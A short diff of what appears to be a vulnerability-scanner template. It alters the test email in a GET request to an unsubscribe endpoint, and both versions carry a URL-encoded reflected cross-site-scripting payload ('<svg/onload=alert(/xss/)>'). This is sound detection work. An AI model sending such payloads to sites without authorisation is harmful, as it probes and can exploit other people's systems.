@@ -17,7 +17,7 @@ info:
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E'
+      - '{{BaseURL}}/email/unsubscribed?email=testnmanp@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E'
     matchers-condition: and
     matchers:
       - type: status
